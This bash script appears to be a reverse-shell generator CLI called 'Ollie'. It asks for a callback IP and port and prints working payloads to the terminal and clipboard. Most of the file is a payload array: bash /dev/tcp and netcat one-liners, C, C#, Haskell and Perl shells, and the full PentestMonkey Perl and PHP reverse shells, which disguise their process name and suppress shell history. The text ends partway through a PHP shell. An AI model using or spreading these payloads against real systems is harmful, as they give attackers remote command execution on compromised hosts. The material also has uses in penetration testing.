#!/bin/bash
#
#
#
#
ENCODINGMETHOD=0
#
C=$(printf '\033')
RED="${C}[1;31m"
GREEN="${C}[1;32m"
YELLOW="${C}[1;33m"
BLUE="${C}[1;34m"
NC="${C}[0m"


banner() {
echo "${RED}"
echo "############################ ${BLUE}Ollie #############################" 
echo "#							       #"
echo "#		  mmmm  \"\"#    \"\"#      \"		       #"
echo "#		 m'  'm   #      #    mmm     mmm	       #"
echo "#		 #    #   #      #      #    #\"  #	       #"
echo "#		 #    #   #      #      #    #\"\"	       #"
echo "#		  #mm#    \"mm   \"mm   mm#mm  \"#mm\"	       #"
echo "#							       #"
echo "#  ${GREEN}~ A Command Line Interface for generating Reverse Shells ~${RED}  #"
echo "# 							       #"
echo "#                	   by ${YELLOW}lf32${RED} 			       #"
echo "#                	   				       #"
echo "${BLUE}############################ ${RED}Ollie #############################" 
echo "${NC}"
}
banner


#
# Socket = IP + PORT
#
socket() {
	echo ""
	read -p "${YELLOW}Enter The IP Address ${GREEN}[Default=10.10.10.10]:${NC} " IPADDR
	[ -z "$IPADDR" ] && IPADDR="10.10.10.10"
	read -p "${YELLOW}Enter The Port Number	    ${GREEN}[Default=9001]:${NC} " PORT
	[ -z "$PORT" ] && PORT="9001"
	echo "${NC}"
}
socket


#
# Platform
#
# Lets not focus on this for now.
#
platform() {
	echo ""
	echo "Choose The Platform You Want To Go With"
	echo -e "[1] Linux\t[2] Windows\t[3] Mac"
	read -p "Pick a number from above [Default=1]: " PLATFORM	
}


#
# Generate Shell Type
#
genShell() {
	echo ""
	echo "${YELLOW}Choose The Shell You Want To Generate${GREEN}"
	echo -e "[1] Reverse\t[2] Bind\t[3] MSFVenom\t[4] HoaxShell"
	read -p "${YELLOW}Pick a number from above ${GREEN}[Default=1]:${NC} " SHELLTYPE

	case $SHELLTYPE in
		1) revPayloadShell ;;
		2) bindPayloadTools ;;
		3) msfVenomPayloadTools ;;
		4) hoaxShellPayloadTools ;;
		*) revPayloadShell ;;
	esac
}

#
# Reverse Shell
# 
# Payload Shell Type
#
revPayloadShell() {
	echo "" 
	echo -e "${RED}=============================== REVERSE SHELL ==============================="
	echo -e "${YELLOW}[SHELL]Choose The Payload Shell To Use${GREEN}"
	echo -e "[1] sh\t\t[2] /bin/sh\t[3] bash\t[4] /bin/bash\t[5] cmd"
	echo -e "[6] powershell\t[7] pwsh\t[8] ash\t\t[9] bsh\t\t[10] csh"
	echo -e "[11] ksh\t[12] zsh\t[13] pkdsh\t[14] tcsh\t[15] mksh"
	echo -e "[16] dash"
	read -p "${YELLOW}Pick a number from above ${GREEN}[Default=1]:${NC} " REVSHELLTYPE
	
	possibleShells=(
		"sh"
		"/bin/sh"
		"bash"
		"/bin/bash"
		"cmd"
		"powershell"
		"pwsh"
		"ash"
		"bsh"
		"csh"
		"ksh"
		"zsh"
		"pkdsh"
		"tcsh"
		"mksh"
		"dash"
	)

	# [[  $REVSHELLTYPE && $REVSHELLTYPE -gt 0 && $REVSHELLTYPE -lt "${#possibleShells[@]}" ]] && SHELLTYPE="${possibleShells[REVSHELLTYPE-1]}" || SHELLTYPE="sh"

	revShellPayloadEncoding
}

#
# Reverse Shell
#
# Reverse Shell Encoding Payload Type
#
revShellPayloadEncoding() {
	echo ""
	echo -e "${YELLOW}[ENCODING] Choose The Encoding Type${GREEN}"
	echo -e "[1] None\t[2] URL Encode\t[3] Double URL Encode\t[4] Base64"
	read -p "${YELLOW}Pick an Encoding Scheme from above ${GREEN}[Default=1]:${NC} " ENCODING

	case $ENCODING in
		1) ENCODINGMETHOD=0;;
		2) ENCODINGMETHOD=1;;
		3) ENCODINGMETHOD=2;;
		4) ENCODINGMETHOD=3;;
		*) ENCODINGMETHOD=0;;
	esac

	revShellPayloadTools
}


#
# ENCODING
#
#
payloadEncoder() {
    # USAGE payloadEncoder "$1"

    old_lang=$LANG
    LANG=C
    
    old_lc_collate=$LC_COLLATE
    LC_COLLATE=C

    local length="${#1}"
    for (( i = 0; i < length; i++ )); do
        local c="${1:i:1}"
        case $c in
            [a-zA-Z0-9.~_-]) printf "$c" ;;
            *) printf '%%%02X' "'$c" ;;
        esac
    done

    LANG=$old_lang
    LC_COLLATE=$old_lc_collate
}


#
# Reverse Shell
#
# Reverse Shell Tools
#
revShellPayloadTools() {
	echo ""
	echo -e "${YELLOW}[REVERSE SHELL] Choose The Type Of Tool You Wish To Use${GREEN}"
	echo -e "[1] Bash -i\t\t[2] Bash 196\t\t[3] Bash readline"
	echo -e "[4] Bash 5\t\t[5] Bash udp\t\t[6] nc mkfifo"
	echo -e "[7] nc -e\t\t[8] nc.exe -e\t\t[9] BusyBox nc -e"
	echo -e "[10] nc -c\t\t[11] ncat -e\t\t[12] ncat.exe -e"
	echo -e "[13] ncat udp\t\t[14] rustcat\t\t[15] C"
	echo -e "[16] C Windows\t\t[17] C# TCP Client\t[18] C# Bash -i"
	echo -e "[19] Haskel #1\t\t[20] Perl\t\t[21] Perl no sh"
	echo -e "[22] Perl PentestMonkey [23] PHP PentestMonkey\t[24] PHP Ivan Sincek"
	echo -e "[25] PHP cmd\t\t[26] PHP cmd 2\t\t[27] PHP cmd small"
	echo -e "[28] PHP exec\t\t[29] PHP shell_exec\t[30] PHP system"
	echo -e "[31] PHP passthru\t[32] PHP \`\t\t[33] PHP popen"
	echo -e "[34] PHP proc_open\t[35] Windows ConPty\t[36] PowerShell #1"
	echo -e "[37] PowerShell #2\t[38] PowerShell #3\t[39] PowerShell #4 (TLS)"
	echo -e "[40] PowerShell #3(b64)\t[41] Python #1\t\t[42] Python #2"
	echo -e "[43] Python3 #1\t\t[44] Python3 #2\t\t[45] Python3 Windows"
	echo -e "[46] Python3 shortest\t[47] Ruby #1\t\t[48] Ruby no sh"
	echo -e "[49] socat #1\t\t[50] socat #2 (TTY)\t[51] node.js"
	echo -e "[52] node.js #2\t\t[53] Java #1\t\t[54] Java #2"
	echo -e "[55] Java #3\t\t[56] Java Web\t\t[57] Java Two Way"
	echo -e "[58] Javascript\t\t[59] Groovy\t\t[60] telnet"
	echo -e "[61] zsh\t\t[62] Lua #1\t\t[63] Lua #2"
	echo -e "[64] Golang\t\t[65] Vlang\t\t[66] Awk"
	echo -e "[67] Dart"
	read -p "${YELLOW}Pick a tool from above ${GREEN}[Default=1]:${NC} " REVSHELLPAYLOAD

	echo -e "\n${YELLOW}=============================== REVERSE SHELL PAYLOAD ===============================${NC}"

	echo "${revShellPayloads[$REVSHELLPAYLOAD-1]}" | xclip -sel c
	echo "${revShellPayloads[$REVSHELLPAYLOAD-1]}"
}


#
# Bind Shell
#
# Bind Shell Payload Tools
#
bindPayloadTools() {
	echo ""
	echo -e "${RED}=============================== BIND SHELL ==============================="
	echo -e "${YELLOW}[BIND SHELL] Choose A Tool You Wish To Use${GREEN}"
	echo -e "[1] Python3 Bind\t[2] PHP Bind"
	read -p "${YELLOW}Pick a number from above ${GREEN}[Default=1]:${NC} " BINDSHELLPAYLOAD

	echo -e "\n${YELLOW}=============================== BIND SHELL PAYLOAD ===============================${NC}"

	case $BINDSHELLPAYLOAD in
		1) echo "${bindShellPayloads[0]}";
			echo "${bindShellPayloads[0]}" | xclip -sel c;
			exit;;
		2) echo ${bindShellPayloads[1]};
			echo "${bindShellPayloads[1]}" | xclip -sel c;
			exit;;
		*) echo ${bindShellPayloads[0]}; 
			echo "${bindShellPayloads[0]}" | xclip -sel c;
			exit;;
	esac
	
}


#
# MSFVenom
#
# MSFVenom Shell Payload Tools
#
msfVenomPayloadTools() {
	echo ""
	echo -e "${RED}=============================== MSFVENOM ==============================="
	echo -e "${YELLOW}[MSFVENOM] Choose a Tool You Wish To Use${GREEN}"
	echo "[1] Linux Meterpreter Staged Reverse TCP (x64)"
	echo "[2] Linux Stageless Reverse TCP (x64)"
	echo "[3] PHP Meterpreter Stageless Reverse TCP"
	echo "[4] PHP Reverse PHP"
	echo "[5] JSP Stageless Reverse TCP"
	echo "[6] WAR Stageless Reverse TCP"
	echo "[7] Python Stageless Reverse TCP"
	echo "[8] Bash Stageless Reverse TCP"
	read -p "${YELLOW}Pick a number from above ${GREEN}[Default=1]:${NC} " MSFVENOMPAYLOAD


	echo -e "\n${YELLOW}=============================== MSFVENOM PAYLOAD ===============================${NC}"


}


#
# HoaxShell
#
# HoaxShell Payloads
#
hoaxShellPayloadTools() {
	echo ""
	echo -e "${RED}=============================== HOAXSHELL ==============================="
	echo -e "${YELLOW}[HoaxShell] Choose a Tool You Wish To Use${GREEN}"
	echo "[1] Windows CMD cURL"
	echo "[2] PowerShell IEX"
	echo "[3] PowerShell IEX Constr Lang Mode"
	echo "[4] PowerShell Outfile"
	echo "[5] PowerShell Outfile Constr Lang Mode"
	echo "[6] Windows CMD cURL https"
	echo "[7] PowerShell IEX https"
	echo "[8] PowerShell Constr Lang Mode IEX https"
	echo "[9] PowerShell Outfile https"
	echo "[10] PowerShell Outfile Constr Lang Mode https"
	read -p "${YELLOW}Pick a number from above ${GREEN}[Default=1]:${NC} " HOAXSHELLPAYLOAD


	# # Check if the input is a valid number, and set it to 1 if not
	if [[ ! "$HOAXSHELLPAYLOAD" =~ ^[0-9]+$ ]]; then
		HoaxShell="${hoaxShellPayloads[0]}"
	fi

	# Check if the input is out the range of possible shells
	if [[ "$HOAXSHELLPAYLOAD" -lt 1 || "$HOAXSHELLPAYLOAD" -gt 10 ]]; then
		HoaxShell="${hoaxShellPayloads[0]}"
	fi

	# Check if the input is within the range of possible shells
	if [[ "$HOAXSHELLPAYLOAD" -gt 0 && "$HOAXSHELLPAYLOAD" -lt 11 ]]; then
		HoaxShell="${hoaxShellPayloads[HOAXSHELLPAYLOAD-1]}"
	fi

	SHELLTYPE="${HoaxShell}"

	echo -e "\n${YELLOW}=============================== HOAXSHELL PAYLOAD ===============================${NC}"
	echo -e "\n>>> Download The HoaxShell Listener at https://github.com/t3l3machus/hoaxshell/tree/main/revshells \n"

	echo $SHELLTYPE | xclip -sel c
	echo $SHELLTYPE

}


#
# Payloads
#


#
# Reverse Shell Payloads
#
revShellPayloads=(
	# 1. Bash -i
	"${SHELLTYPE} -i >& /dev/tcp/${IPADDR}/${PORT} 0>&1" \
	# 2. Bash 196
	"0<&196;exec 196<>/dev/tcp/${IPADDR}/${PORT}; ${SHELLTYPE} <&196 >&196 2>&196"
	# 3. Bash readline
	"exec 5<>/dev/tcp/${IPADDR}/${PORT};cat <&5 | while read line; do \$line 2>&5 >&5; done" 
	# 4. Bash 5
	"${SHELLTYPE} -i 5<> /dev/tcp/${IPADDR}/${PORT} 0<&5 1>&5 2>&5"
	# 5. Bash udp
	"${SHELLTYPE} -i >& /dev/udp/${IPADDR}/${PORT} 0>&1"
	# 6. nc mkfifo
	"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${SHELLTYPE} -i 2>&1|nc ${IPADDR} ${PORT} >/tmp/f"
	# 7. nc -e
	"nc ${IPADDR} ${PORT} -e ${SHELLTYPE}"
	# 8. nc.exe -e
	"nc.exe ${IPADDR} ${PORT} -e ${SHELLTYPE}"
	# 9. BusyBox nc -e
	"busybox nc ${IPADDR} ${PORT} -e ${SHELLTYPE}"
	# 10. nc -c
	"nc -c ${SHELLTYPE} ${IPADDR} ${PORT}"
	# 11. ncat -e
	"ncat ${IPADDR} ${PORT} -e ${SHELLTYPE}"
	# 12. ncat.exe -e
	"ncat.exe ${IPADDR} ${PORT} -e ${SHELLTYPE}"
	# 13. ncat udp
	"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${SHELLTYPE} -i 2>&1|ncat -u ${IPADDR} ${PORT} >/tmp/f"
	# 14. rustcat
	"rcat ${IPADDR} ${PORT} -r ${SHELLTYPE}"
	# 15. C
	"#include <stdio.h>
	#include <sys/socket.h>
	#include <sys/types.h>
	#include <stdlib.h>
	#include <unistd.h>
	#include <netinet/in.h>
	#include <arpa/inet.h>

	int main(void){
	    int port = ${PORT};
	    struct sockaddr_in revsockaddr;

	    int sockt = socket(AF_INET, SOCK_STREAM, 0);
	    revsockaddr.sin_family = AF_INET;       
	    revsockaddr.sin_port = htons(port);
	    revsockaddr.sin_addr.s_addr = inet_addr(\"${IPADDR}\");

	    connect(sockt, (struct sockaddr *) &revsockaddr, 
	    sizeof(revsockaddr));
	    dup2(sockt, 0);
	    dup2(sockt, 1);
	    dup2(sockt, 2);

	    char * const argv[] = {\"${SHELLTYPE}\", NULL};
	    execve(\"${SHELLTYPE}\", argv, NULL);

	    return 0;       
	}"
	# 16. C Windows
	"#include <winsock2.h>
	#include <stdio.h>
	#pragma comment(lib,\"ws2_32\")

	WSADATA wsaData;
	SOCKET Winsock;
	struct sockaddr_in hax; 
	char ip_addr[16] = \"${IPADDR}\"; 
	char port[6] = \"${PORT}\";            

	STARTUPINFO ini_processo;

	PROCESS_INFORMATION processo_info;

	int main()
	{
	    WSAStartup(MAKEWORD(2, 2), &wsaData);
	    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);


	    struct hostent *host; 
	    host = gethostbyname(ip_addr);
	    strcpy_s(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));

	    hax.sin_family = AF_INET;
	    hax.sin_port = htons(atoi(port));
	    hax.sin_addr.s_addr = inet_addr(ip_addr);

	    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

	    memset(&ini_processo, 0, sizeof(ini_processo));
	    ini_processo.cb = sizeof(ini_processo);
	    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
	    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

	    TCHAR cmd[255] = TEXT(\"cmd.exe\");

	    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

	    return 0;
	}"
	# 17. C# TCP Client
	"using System;
	using System.Text;
	using System.IO;
	using System.Diagnostics;
	using System.ComponentModel;
	using System.Linq;
	using System.Net;
	using System.Net.Sockets;


	namespace ConnectBack
	{
		public class Program
		{
			static StreamWriter streamWriter;

			public static void Main(string[] args)
			{
				using(TcpClient client = new TcpClient(\"${IPADDR}\", ${PORT}))
				{
					using(Stream stream = client.GetStream())
					{
						using(StreamReader rdr = new StreamReader(stream))
						{
							streamWriter = new StreamWriter(stream);

							StringBuilder strInput = new StringBuilder();

							Process p = new Process();
							p.StartInfo.FileName = \"${SHELLTYPE}\";
							p.StartInfo.CreateNoWindow = true;
							p.StartInfo.UseShellExecute = false;
							p.StartInfo.RedirectStandardOutput = true;
							p.StartInfo.RedirectStandardInput = true;
							p.StartInfo.RedirectStandardError = true;
							p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
							p.Start();
							p.BeginOutputReadLine();

							while(true)
							{
								strInput.Append(rdr.ReadLine());
								//strInput.Append(\"\\n\");
								p.StandardInput.WriteLine(strInput);
								strInput.Remove(0, strInput.Length);
							}
						}
					}
				}
			}

			private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
	        {
	            StringBuilder strOutput = new StringBuilder();

	            if (!String.IsNullOrEmpty(outLine.Data))
	            {
	                try
	                {
	                    strOutput.Append(outLine.Data);
	                    streamWriter.WriteLine(strOutput);
	                    streamWriter.Flush();
	                }
	                catch (Exception err) { }
	            }
	        }

		}
	}"
	# 18. C# Bash -i
	"using System;
	using System.Diagnostics;
	
	namespace BackConnect {
	  class ReverseBash {
		public static void Main(string[] args) {
		  Process proc = new System.Diagnostics.Process();
		  proc.StartInfo.FileName = \"${SHELLTYPE}\";
		  proc.StartInfo.Arguments = \"-c \"mksh -i >& /dev/tcp/${IPADDR}/${PORT} 0>&1\\\"\";
		  proc.StartInfo.UseShellExecute = false;
		  proc.StartInfo.RedirectStandardOutput = true;
		  proc.Start();
	
		  while (!proc.StandardOutput.EndOfStream) {
			Console.WriteLine(proc.StandardOutput.ReadLine());
		  }
		}
	  }
	}"
	# 19. Haskel #1
	"module Main where

	import System.Process

	main = callCommand \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | ${SHELLTYPE} -i 2>&1 | nc ${IPADDR} ${PORT} >/tmp/f\""
	# 20. Perl
	"perl -e 'use Socket;\$i=\"${IPADDR}\";\$p=${PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"${REVSHELLTYPE} -i\");};'"
	# 21. Perl no sh
	"perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"${IPADDR}:${PORT}\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
	# 22. Perl PentestMonkey
	"#!/usr/bin/perl -w
	# perl-reverse-shell - A Reverse Shell implementation in PERL
	# Copyright (C) 2006 pentestmonkey@pentestmonkey.net
	#
	# This tool may be used for legal purposes only.  Users take full responsibility
	# for any actions performed using this tool.  The author accepts no liability
	# for damage caused by this tool.  If these terms are not acceptable to you, then
	# do not use this tool.
	#
	# In all other respects the GPL version 2 applies:
	#
	# This program is free software; you can redistribute it and/or modify
	# it under the terms of the GNU General Public License version 2 as
	# published by the Free Software Foundation.
	#
	# This program is distributed in the hope that it will be useful,
	# but WITHOUT ANY WARRANTY; without even the implied warranty of
	# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	# GNU General Public License for more details.
	#
	# You should have received a copy of the GNU General Public License along
	# with this program; if not, write to the Free Software Foundation, Inc.,
	# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
	#
	# This tool may be used for legal purposes only.  Users take full responsibility
	# for any actions performed using this tool.  If these terms are not acceptable to
	# you, then do not use this tool.
	#
	# You are encouraged to send comments, improvements or suggestions to
	# me at pentestmonkey@pentestmonkey.net
	#
	# Description
	# -----------
	# This script will make an outbound TCP connection to a hardcoded IP and port.
	# The recipient will be given a shell running as the current user (apache normally).
	#

	use strict;
	use Socket;
	use FileHandle;
	use POSIX;
	my \$VERSION = \"1.0\";

	# Where to send the reverse shell.  Change these.
	my \$ip = '${IPADDR}';
	my \$port = ${PORT};

	# Options
	my \$daemon = 1;
	my \$auth   = 0; # 0 means authentication is disabled and any 
			# source IP can access the reverse shell
	my \$authorised_client_pattern = qr(^127\.0\.0\.1$);

	# Declarations
	my \$global_page = \"\";
	my \$fake_process_name = \"/usr/sbin/apache\";

	# Change the process name to be less conspicious
	\$0 = \"[httpd]\";

	# Authenticate based on source IP address if required
	if (defined(\$ENV{'REMOTE_ADDR'})) {
		cgiprint(\"Browser IP address appears to be: \$ENV{'REMOTE_ADDR'}\");

		if (\$auth) {
			unless (\$ENV{'REMOTE_ADDR'} =~ \$authorised_client_pattern) {
				cgiprint(\"ERROR: Your client isn't authorised to view this page\");
				cgiexit();
			}
		}
	} elsif (\$auth) {
		cgiprint(\"ERROR: Authentication is enabled, but I couldn't determine your IP address.  Denying access\");
		cgiexit(0);
	}

	# Background and dissociate from parent process if required
	if (\$daemon) {
		my \$pid = fork();
		if (\$pid) {
			cgiexit(0); # parent exits
		}

		setsid();
		chdir('/');
		umask(0);
	}

	# Make TCP connection for reverse shell
	socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
	if (connect(SOCK, sockaddr_in(\$port,inet_aton(\$ip)))) {
		cgiprint(\"Sent reverse shell to \$ip:\$port\");
		cgiprintpage();
	} else {
		cgiprint(\"Couldn't open reverse shell to \$ip:\$port: \$!\");
		cgiexit();	
	}

	# Redirect STDIN, STDOUT and STDERR to the TCP connection
	open(STDIN, \">&SOCK\");
	open(STDOUT,\">&SOCK\");
	open(STDERR,\">&SOCK\");
	\$ENV{'HISTFILE'} = '/dev/null';
	system(\"w;uname -a;id;pwd\");
	exec({\"${SHELLTYPE}\"} (\$fake_process_name, \"-i\"));

	# Wrapper around print
	sub cgiprint {
		my \$line = shift;
		\$line .= \"<p>\\n\";
		\$global_page .= \$line;
	}

	# Wrapper around exit
	sub cgiexit {
		cgiprintpage();
		exit 0; # 0 to ensure we don't give a 500 response.
	}

	# Form HTTP response using all the messages gathered by cgiprint so far
	sub cgiprintpage {
		print \"Content-Length: \" . length(\$global_page) . \"\\r
	Connection: close\\r
	Content-Type: text\/html\\r\\n\\r\\n\" . \$global_page;
	}
	"
	# 23. PHP PentestMonkey
	"<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
\$VERSION = \"1.0\";
\$ip = '${IPADDR}';
\$port = ${PORT};
\$chunk_size = 1400;
\$write_a = null;
\$error_a = null;
\$shell = 'uname -a; w; id; tcsh -i';
\$daemon = 0;
\$debug = 0;

if (function_exists('pcntl_fork')) {
	\$pid = pcntl_fork();
	
	if (\$pid == -1) {
		printit(\"ERROR: Can't fork\");
		exit(1);
	}
	
	if (\$pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit(\"Error: Can't setsid()\");
		exit(1);
	}

	\$daemon = 1;
} else {
	printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");
}

chdir(\"/\");

umask(0);

// Open reverse connection
\$sock = fsockopen(\$ip, \$port, \$errno, \$errstr, 30);
if (!\$sock) {
	printit(\"\$errstr (\$errno)\");
	exit(1);
}

\$descriptorspec = array(
   0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from
   1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to
   2 => array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to
);

\$process = proc_open(\$shell, \$descriptorspec, \$pipes);

if (!is_resource(\$process)) {
	printit(\"ERROR: Can't spawn shell\");
	exit(1);
}

stream_set_blocking(\$pipes[0], 0);
stream_set_blocking(\$pipes[1], 0);
stream_set_blocking(\$pipes[2], 0);
stream_set_blocking(\$sock, 0);

printit(\"Successfully opened reverse shell to \$ip:\$port\");

while (1) {
	if (feof(\$sock)) {
		printit(\"ERROR: Shell connection terminated\");
		break;
	}

	if (feof(\$pipes[1])) {
		printit(\"ERROR: Shell process terminated\");
		break;
	}

	\$read_a = array(\$sock, \$pipes[1], \$pipes[2]);
	\$num_changed_sockets = stream_select(\$read_a, \$write_a, \$error_a, null);

	if (in_array(\$sock, \$read_a)) {
		if (\$debug) printit(\"SOCK READ\");
		\$input = fread(\$sock, \$chunk_size);
		if (\$debug) printit(\"SOCK: \$input\");
		fwrite(\$pipes[0], \$input);
	}

	if (in_array(\$pipes[1], \$read_a)) {
		if (\$debug) printit(\"STDOUT READ\");
		\$input = fread(\$pipes[1], \$chunk_size);
		if (\$debug) printit(\"STDOUT: \$input\");
		fwrite(\$sock, \$input);
	}

	if (in_array(\$pipes[2], \$read_a)) {
		if (\$debug) printit(\"STDERR READ\");
		\$input = fread(\$pipes[2], \$chunk_size);
		if (\$debug) printit(\"STDERR: \$input\");
		fwrite(\$sock, \$input);
	}
}

fclose(\$sock);
fclose(\$pipes[0]);
fclose(\$pipes[1]);
fclose(\$pipes[2]);
proc_close(\$process);

function printit (\$string) {
	if (!\$daemon) {
		print \"\$string\\n\";
	}
}

?>"
	# 24. PHP Ivan Sincek
	"<?php
// Copyright (c) 2020 Ivan Sincek
// v2.3
// Requires PHP v5.0.0 or greater.
// Works on Linux OS, macOS, and Windows OS.
// See the original script at https://github.com/pentestmonkey/php-reverse-shell.
class Shell {
    private \$addr  = null;
    private \$port  = null;
    private \$os    = null;
    private \$shell = null;
    private \$descriptorspec = array(
        0 => array('pipe', 'r'), // shell can read from STDIN
        1 => array('pipe', 'w'), // shell can write to STDOUT
        2 => array('pipe', 'w')  // shell can write to STDERR
    );
    private \$buffer  = 1024;    // read/write buffer size
    private \$clen    = 0;       // command length
    private \$error   = false;   // stream read/write error
    public function __construct(\$addr, \$port) {
        \$this->addr = \$addr;
        \$this->port = \$port;
    }
    private function detect() {
        \$detected = true;
        if (stripos(PHP_OS, 'LINUX') !== false) { // same for macOS
            \$this->os    = 'LINUX';
            \$this->shell = 'tcsh';
        } else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {
            \$this->os    = 'WINDOWS';
            \$this->shell = 'cmd.exe';
        } else {
            \$detected = false;
            echo \"SYS_ERROR: Underlying operating system is not supported, script will now exit...\\n\";
        }
        return \$detected;
    }
    private function daemonize() {
        \$exit = false;
        if (!function_exists('pcntl_fork')) {
            echo \"DAEMONIZE: pcntl_fork() does not exists, moving on...\\n\";
        } else if (($pid = @pcntl_fork()) < 0) {
            echo \"DAEMONIZE: Cannot fork off the parent process, moving on...\\n\";
        } else if (\$pid > 0) {
            \$exit = true;
            echo \"DAEMONIZE: Child process forked off successfully, parent process will now exit...\\n\";
        } else if (posix_setsid() < 0) {
            // once daemonized you will actually no longer see the script's dump
            echo \"DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\\n\";
        } else {
            echo \"DAEMONIZE: Completed successfully!\\n\";
        }
        return \$exit;
    }
    private function settings() {
        @error_reporting(0);
        @set_time_limit(0); // do not impose the script execution time limit
        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories
    }
    private function dump(\$data) {
        \$data = str_replace('<', '&lt;', \$data);
        \$data = str_replace('>', '&gt;', \$data);
        echo \$data;
    }
    private function read(\$stream, \$name, \$buffer) {
        if ((\$data = @fread(\$stream, \$buffer)) === false) { // suppress an error when reading from a closed blocking stream
            \$this->error = true;                            // set global error flag
            echo \"STRM_ERROR: Cannot read from \${name}, script will now exit...\\n\";
        }
        return \$data;
    }
    private function write(\$stream, \$name, \$data) {
        if ((\$bytes = @fwrite(\$stream, \$data)) === false) { // suppress an error when writing to a closed blocking stream
            \$this->error = true;                            // set global error flag
            echo \"STRM_ERROR: Cannot write to \${name}, script will now exit...\\n\";
        }
        return \$bytes;
    }
    // read/write method for non-blocking streams
    private function rw(\$input, \$output, \$iname, \$oname) {
        while ((\$data = \$this->read(\$input, \$iname, \$this->buffer)) && \$this->write(\$output, \$oname, \$data)) {
            if (\$this->os === 'WINDOWS' && \$oname === 'STDIN') { \$this->clen += strlen(\$data); } // calculate the command length
            \$this->dump(\$data); // script's dump
        }
    }
    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
    // we must read the exact byte length from a stream and not a single byte more
    private function brw(\$input, \$output, \$iname, \$oname) {
        \$fstat = fstat(\$input);
        \$size = \$fstat['size'];
        if (\$this->os === 'WINDOWS' && \$iname === 'STDOUT' && \$this->clen) {
            // for some reason Windows OS pipes STDIN into STDOUT
            // we do not like that
            // we need to discard the data from the stream
            while (\$this->clen > 0 && (\$bytes = \$this->clen >= \$this->buffer ? \$this->buffer : \$this->clen) && \$this->read(\$input, \$iname, \$bytes)) {
                \$this->clen -= \$bytes;
                \$size -= \$bytes;
            }
        }
        while (\$size > 0 && (\$bytes = \$size >= \$this->buffer ? \$this->buffer : \$size) && (\$data = \$this->read(\$input, \$iname, \$bytes)) && \$this->write(\$output, \$oname, \$data)) {
            \$size -= \$bytes;
            \$this->dump(\$data); // script's dump
        }
    }
    public function run() {
        if (\$this->detect() && !\$this->daemonize()) {
            \$this->settings();

            // ----- SOCKET BEGIN -----
            \$socket = @fsockopen(\$this->addr, \$this->port, \$errno, \$errstr, 30);
            if (!\$socket) {
                echo \"SOC_ERROR: {\$errno}: {\$errstr}\\n\";
            } else {
                stream_set_blocking(\$socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS

                // ----- SHELL BEGIN -----
                \$process = @proc_open(\$this->shell, \$this->descriptorspec, \$pipes, null, null);
                if (!\$process) {
                    echo \"PROC_ERROR: Cannot start the shell\\n\";
                } else {
                    foreach (\$pipes as \$pipe) {
                        stream_set_blocking(\$pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
                    }

                    // ----- WORK BEGIN -----
                    \$status = proc_get_status(\$process);
                    @fwrite(\$socket, \"SOCKET: Shell has connected! PID: \" . \$status['pid'] . \"\\n\");
                    do {
						\$status = proc_get_status(\$process);
                        if (feof(\$socket)) { // check for end-of-file on SOCKET
                            echo \"SOC_ERROR: Shell connection has been terminated\\n\"; break;
                        } else if (feof(\$pipes[1]) || !\$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
                            echo \"PROC_ERROR: Shell process has been terminated\\n\";   break; // feof() does not work with blocking streams
                        }                                                                    // use proc_get_status() instead
                        \$streams = array(
                            'read'   => array(\$socket, \$pipes[1], \$pipes[2]), // SOCKET | STDOUT | STDERR
                            'write'  => null,
                            'except' => null
                        );
                        \$num_changed_streams = @stream_select(\$streams['read'], \$streams['write'], \$streams['except'], 0); // wait for stream changes | will not wait on Windows OS
                        if (\$num_changed_streams === false) {
                            echo \"STRM_ERROR: stream_select() failed\\n\"; break;
                        } else if (\$num_changed_streams > 0) {
                            if (\$this->os === 'LINUX') {
                                if (in_array(\$socket  , \$streams['read'])) { \$this->rw(\$socket  , \$pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (in_array(\$pipes[2], \$streams['read'])) { \$this->rw(\$pipes[2], \$socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (in_array(\$pipes[1], \$streams['read'])) { \$this->rw(\$pipes[1], \$socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            } else if (\$this->os === 'WINDOWS') {
                                // order is important
